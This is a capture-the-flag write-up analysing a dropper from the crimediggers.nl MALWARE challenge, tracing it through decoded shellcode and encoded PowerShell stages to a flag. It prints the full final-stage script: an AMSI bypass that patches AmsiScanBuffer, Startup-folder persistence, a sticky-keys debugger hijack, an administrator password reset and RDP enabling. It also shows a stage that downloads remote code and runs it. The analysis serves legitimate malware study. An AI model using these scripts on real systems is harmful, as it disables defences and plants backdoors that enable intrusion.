# crimediggers.nl - MALWARE CTF

The MALWARE entry is new and there doesn't seem to be an explanation about it online yet, so I decided to do it.
This repository also includes the files that I quickly put together during the process.


## Breakdown

### 1. Initial
Dropping the "dropper" PE into DIE for initial file analysis shows that it is a .NET PE: 
![](https://github.com/nerfnet/crimediggers-malware/blob/main/img/die.png?raw=true)


This means that we can take the executable into ILSpy to easily decompile it for further static analysis.
With the dropper decompiled, we notice there are only 2 functions of significance for us to look into:
* **sandboxChecks()**
* **shellcodeRunner()**
  
![](https://github.com/nerfnet/crimediggers-malware/blob/main/img/inspy-tree.png?raw=true)

Which are both invoked in Main(). 


As I had no intend of ever running the dropper in a debugger, or anywhere at all, my eyes were first drawn to the **shellcodeRunner()** function. Analysing this function, you will notice an array of bytes declared as local variable,
representing the shellcode. It's a relatively large array, meaning that this is a pretty big payload, suggesting that
the shellcode is not polymorphic which makes further analysis pretty straightforward.

![](https://github.com/nerfnet/crimediggers-malware/blob/main/img/shellcode.png?raw=true)

The shellcode being readily available like this to us means we do in fact not have to do any dynamic analysis yet, however looking further down the **shellcodeRunner()** function you will notice there seems to be some basic decoding going on on the aforementioned shellcode. Below is the code responsible for decoding the shellcode:
```C#
	for (int i = 0; i < array.Length; i++)
	{
		array[i] = (byte)((uint)(array[i] - 2) & 0xFFu);
	}
```
In this piece of code, each byte is decremented by 2 and followed up by an `AND` operation against the value 0xFF(255), ensuring that the result of the operation will stay between 0 and 255. For clarity, a byte represents 8 bits, meaning that a single (unsigned) byte can have any value between 0 and 255. Now that we have both the shellcode and the decoding technique, we can write a quick tool to decode the shellcode, effectively making an analysis of the **sandboxChecks()** function irrelevant, especially since it just contains a couple of ancient sandbox evasion/detection techniques.

### 2. Shellcode Analysis
The file `shdc.c` contains the code which does the decoding, it's pretty straightforward as the earlier decompiled C# code basically does the work for us. Compile the code using any compiler. For example using MSVC, simply run the following command from a VS Developer Prompt:
```
cl.exe shdc.c
```
This will compile an executable `shdc.exe`, which can be ran and drops the shellcode in a binary to the current directory. To make analyzing the binary easier, we will write a small program in Assembler(`shdc.asm` in this repository) which embeds the raw binary containing the shellcode into a simple executable. This allows us to use tools like IDA or Ghidra to disassemble the shellcode and inspect it. It executes a single `LEA` instruction, which tells the CPU to load the memory address of the binary into the `RSI` register. This is useful since the disassembler will give us an easily accessible reference to the location of the shellcode in our executable.


Looking at the disassembly of our executable, we can find our LEA instruction: 
```asm
00401000  LEA    RSI,[DAT_00403000]
```
This shows us that the binary data that we included is located at address 0x00403000 inside our executable. I quickly realized that all this shellcode tried to do was launch a powershell script, which became evident
from the data located at address 0x0040310b:
![](https://github.com/nerfnet/crimediggers-malware/blob/main/img/pshell.png?raw=true)


The script is base64 encoded, as per the `-enc` command/flag specified when it is attempting to run powershell. Decoding the base64 data yields the following result:
```powershell
$wc = [System.Net.WebClient]::new();
$targeturl = 'https://heransomware.nl/lsdkafj8fjaf2398fulsd/evil.txt';    <---- What we are looking for
```
_Some lines have been omitted for brevity, since the only variable of significance here is the `targeturl`_.

Notably, when visiting the found URL it will result in a 404. This doesn't seem to be intentional but a mistake, as during dynamic analysis the script fails to download the text file and simply terminates. Nevertheless, the web server allows us to view the contents of the `lsdkafj8fjaf2398fulsd` directory, in which I found a file called `evil1.txt` instead of `evil.txt`: 


![](https://github.com/nerfnet/crimediggers-malware/blob/main/img/caddy.png?raw=true)

### 3. evil(1).txt
Analyzing the contents of the evil1.txt file, you will quickly notice that it tries to invoke some arbitrary commands stored in the $LoadCode variable. Once again, this is some Base64 encoded data with some simple obfuscation applied to it:
```powershell
$best64code = "==gCNo... base64 encoded data"
$base64 = $best64code.ToCharArray() ; [array]::Reverse($base64) ; -join $base64 2>&1> $null
$LoadCode = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("$base64"))
$LoadCode | iex
```
_Some of the base64 data is omitted for brevity_.

Luckily for us, all we have to do is copy the code and replace the last line where it invokes the code with something that allows us to access the decoded data:
```powershell
$best64code = "==gCNo... base64 encoded data"
$base64 = $best64code.ToCharArray() ; [array]::Reverse($base64) ; -join $base64 2>&1> $null
$LoadCode = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("$base64"))
$LoadCode | Out-File -FilePath "code.txt"
```
Now, instead of invoking the code, it is simply being written to a file `code.txt` for further analysis.

The output result is as follows:
```powershell
$code = @"
using System;
using System.Runtime.InteropServices;

public class WinApi {
	
	[DllImport("kernel32")]
	public static extern IntPtr LoadLibrary(string name);
	
	[DllImport("kernel32")]
	public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
	
	[DllImport("kernel32")]
	public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out int lpflOldProtect);
}
"@

Add-Type $code
$amsiDll = [WinApi]::LoadLibrary("amsi.dll")
$asbAddr = [WinApi]::GetProcAddress($amsiDll, "Ams"+"iScan"+"Buf"+"fer")
$ret = [Byte[]] ( 0xc3, 0x80, 0x07, 0x00,0x57, 0xb8 )
$out = 0
$backdoor = $home + "\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"

[WinApi]::VirtualProtect($asbAddr, [uint32]$ret.Length, 0x40, [ref] $out)
[System.Runtime.InteropServices.Marshal]::Copy($ret, 0, $asbAddr, $ret.Length)
[WinApi]::VirtualProtect($asbAddr, [uint32]$ret.Length, $out, [ref] $null)

$file = "~\Downloads\dropper.exe"
#If the file does not exist, create it.
if (-not(Test-Path -Path $file -PathType Leaf)) {
     try {
		
        Write-Host "[-] dropper is not present..."
		Exit
     }
     catch {
         throw $_.Exception.Message
		 Exit
     }
 }
Write-Host "[+] dropper is present"
$ABC = "{:g"+ $backdoor[-5] +"lF"

Copy-Item $file $backdoor
IF (${env:=::} -eq $null)
	{
	$XYZ = ([regex]::Matches($ABC,'.','RightToLeft')).Value -join ''
	Write-Host "[+] installing backdoor"
	$key1 = "exe.chtes\snoitpO noitucexE eliF egamI\noisreVtnerruC\TN swodniW\tfosorciM\ERAWTFOS\MLKH"
	$key1 = ([regex]::Matches($key1,'.','RightToLeft')).Value -join ''
	
	$key2 = "revreS lanimreT\lortnoC\teSlortnoCtnerruC\METSYS\ENIHCAM_LACOL_YEKH"
	$key2 = ([regex]::Matches($key2,'.','RightToLeft')).Value -join ''
	
	REG ADD $key1 /v Debugger /t REG_SZ /d $env:comspec
	net user administrator /active:yes
	$4574134897 = $XYZ + $backdoor[-15] + "4n"+ $env:comspec[13] +"0m3" + $env:comspec[3] + "4re_" + [int]$null + $code[-198] + "G3"+ $backdoor[-15] +"0ld}"
	net user administrator $4574134897
	reg add $key2 /v fDenyTSConnections /t REG_DWORD /d 0 /f
	netsh advfirewall firewall set rule group="remote desktop" new enable=Yes
	}
ELSE
{
	Write-Host "[+] skipping backdoor"
}
```
The script does a couple of things, but most notably is that it tries to patch the AmsiScanBuffer function of AMSI and it sets the password of the local administrator account to something peculiar.  


Let's dive further into the new local administrator password:
```
$4574134897 = $XYZ + $backdoor[-15] + "4n"+ $env:comspec[13] +"0m3" + $env:comspec[3] + "4re_" + [int]$null + $code[-198] + "G3"+ $backdoor[-15] +"0ld}"
```


Now, we could try to figure out what the value of `$4574134897` is manually. Or we simply tweak the script and let it do the work for us:
```powershell
$code = @"
using System;
using System.Runtime.InteropServices;

public class WinApi {
	
	[DllImport("kernel32")]
	public static extern IntPtr LoadLibrary(string name);
	
	[DllImport("kernel32")]
	public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
	
	[DllImport("kernel32")]
	public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out int lpflOldProtect);
}
"@

Add-Type $code
$backdoor = $home + "\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
$ABC = "{:g"+ $backdoor[-5] +"lF"
$XYZ = ([regex]::Matches($ABC,'.','RightToLeft')).Value -join ''
$4574134897 = $XYZ + $backdoor[-15] + "4n"+ $env:comspec[13] +"0m3" + $env:comspec[3] + "4re_" + [int]$null + $code[-198] + "G3"+ $backdoor[-15] +"0ld}"
Write-Host $4574134897
```


Final result:

![](https://github.com/nerfnet/crimediggers-malware/blob/main/img/flag.png?raw=true)

### End
Questions or need help? Feel free to reach out:
nerf_the_net@protonmail.com

Have a good day!
